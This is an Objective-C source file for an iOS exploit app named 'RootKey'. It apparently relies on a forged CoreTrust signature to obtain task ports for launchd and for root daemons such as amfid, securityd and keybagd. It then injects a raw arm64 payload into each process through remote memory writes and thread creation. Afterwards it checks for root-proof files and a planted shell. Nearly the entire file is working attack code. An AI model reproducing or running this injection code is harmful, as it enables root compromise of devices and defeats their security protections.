// main.m — RootKey: task_for_pid(launchd/root daemon) -> inject raw arm64 payload.
// Target: iPhone14,7 iOS 27.2 RC. Build: Theos. Signed with crafted CoreTrust CMS.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/arm/thread_status.h>
#import <sys/sysctl.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <arpa/inet.h>
#include "payload_blob.h"

extern int task_for_pid(mach_port_t target_tport, int pid, mach_port_t *t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t);
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);
#define PROC_ALL_PIDS 1
#define PROC_PIDPATHINFO_MAXSIZE 4096
extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
#define CS_OPS_ENTITLEMENTS_BLOB 7

static NSMutableString *gLog;
static NSString *gLogPath;

static void flog(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[rootkey] %@", s);
    [gLog appendFormat:@"%@\n", s];
    NSData *d = [gLog dataUsingEncoding:NSUTF8StringEncoding];
    [d writeToFile:gLogPath options:NSDataWritingAtomic error:nil];
    int fd = open(gLogPath.fileSystemRepresentation, O_RDONLY); if (fd >= 0) { fsync(fd); close(fd); }
}

static NSString *read_short(NSString *path) {
    NSData *d = [NSData dataWithContentsOfFile:path];
    if (!d) return @"(missing)";
    NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    return s ? [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] : @"(binary)";
}

static void dump_ents(void) {
    unsigned char buf[16384]; memset(buf, 0, sizeof buf);
    int r = csops(getpid(), CS_OPS_ENTITLEMENTS_BLOB, buf, sizeof buf);
    flog(@"csops(ents) r=%d errno=%d", r, errno);
    if (r != 0) return;
    uint32_t magic = ntohl(*(uint32_t *)buf), len = ntohl(*(uint32_t *)(buf + 4));
    flog(@"ents magic=0x%08x len=%u", magic, len);
    if (len > sizeof(buf) - 8) len = sizeof(buf) - 8;
    NSString *xml = [[NSString alloc] initWithBytes:buf + 8 length:len encoding:NSUTF8StringEncoding];
    if (xml) flog(@"ents xml:\n%@", xml);
}

static kern_return_t inject_pid(pid_t pid, const char *name) {
    mach_port_t tfp = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &tfp);
    flog(@"task_for_pid(%s pid=%d) -> %d (tfp=%u)", name, pid, kr, tfp);
    if (kr != KERN_SUCCESS) return kr;

    mach_vm_address_t addr = 0;
    mach_vm_size_t size = 0x10000;
    kr = mach_vm_allocate(tfp, &addr, size, VM_FLAGS_ANYWHERE);
    flog(@"mach_vm_allocate -> %d addr=0x%llx", kr, (unsigned long long)addr);
    if (kr != KERN_SUCCESS) return kr;

    kr = mach_vm_write(tfp, addr, (vm_offset_t)payload_bin, (mach_msg_type_number_t)payload_bin_len);
    flog(@"mach_vm_write(%u bytes) -> %d", payload_bin_len, kr);
    if (kr != KERN_SUCCESS) return kr;

    kr = mach_vm_protect(tfp, addr, size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    flog(@"mach_vm_protect RX -> %d", kr);
    if (kr != KERN_SUCCESS) {
        kr = mach_vm_protect(tfp, addr, size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
        flog(@"mach_vm_protect RWX -> %d", kr);
        if (kr != KERN_SUCCESS) return kr;
    }

    thread_act_t thr = MACH_PORT_NULL;
    kr = thread_create(tfp, &thr);
    flog(@"thread_create -> %d thr=%u", kr, thr);
    if (kr != KERN_SUCCESS) return kr;

    arm_thread_state64_t st; memset(&st, 0, sizeof st);
    st.__pc = (uint64_t)addr;
    st.__sp = (uint64_t)(addr + 0x8000);
    st.__lr = 0;
    st.__cpsr = 0x60000000;
    kr = thread_set_state(thr, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
    flog(@"thread_set_state -> %d", kr);
    if (kr != KERN_SUCCESS) return kr;

    kr = thread_resume(thr);
    flog(@"thread_resume -> %d", kr);
    return kr;
}

static void run(void) {
    flog(@"=== RootKey start uid=%d euid=%d pid=%d ===", getuid(), geteuid(), getpid());
    dump_ents();

    // 1) launchd
    inject_pid(1, "launchd");

    // 2) root daemons reachable from the app sandbox
    const char *want[] = {
        "backupd", "mobileassetd", "locationd", "configd", "nehelper",
        "filecoordinationd", "powerd", "amfid", "keybagd", "usermanagerd",
        "deviceconfigurationd", "securityd", "wifid", "fseventsd",
        "deleted_helper", "mobileassetd", "tzlinkd", NULL
    };
    int pids[4096]; int n = proc_listpids(PROC_ALL_PIDS, 0, pids, sizeof pids);
    flog(@"proc_listpids -> %d", n);
    if (n > 0) {
        int count = n / (int)sizeof(int);
        for (int i = 0; i < count; i++) {
            int pid = pids[i]; if (pid <= 1) continue;
            char path[PROC_PIDPATHINFO_MAXSIZE]; memset(path, 0, sizeof path);
            if (proc_pidpath(pid, path, sizeof path) <= 0) continue;
            NSString *p = [NSString stringWithUTF8String:path] ?: @"";
            for (int k = 0; want[k]; k++) {
                if ([p.lastPathComponent isEqualToString:[NSString stringWithUTF8String:want[k]]]) {
                    inject_pid(pid, want[k]);
                    break;
                }
            }
        }
    }

    sleep(4);
    flog(@"rootproof          = %@", read_short(@"/var/mobile/rootproof"));
    flog(@"rootproof_launchd  = %@", read_short(@"/var/mobile/rootproof_launchd"));
    flog(@"root_ok            = %@", read_short(@"/var/mobile/root_ok"));
    flog(@"root_ok_launchd    = %@", read_short(@"/var/mobile/root_ok_launchd"));
    struct stat sb;
    if (stat("/var/mobile/sh", &sb) == 0) flog(@"/var/mobile/sh mode=%o uid=%d", sb.st_mode & 07777, sb.st_uid);
    else flog(@"/var/mobile/sh stat errno=%d", errno);
    flog(@"=== RootKey done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:docs withIntermediateDirectories:YES attributes:nil error:nil];
    gLogPath = [docs stringByAppendingPathComponent:@"rootkey.log"];
    gLog = [NSMutableString stringWithString:@"\n===== RootKey =====\n"];
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO; self.tv.font = [UIFont fontWithName:@"Menlo" size:9];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc; [self.window makeKeyAndVisible];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            run();
            dispatch_async(dispatch_get_main_queue(), ^{ self.tv.text = gLog; });
        });
    });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
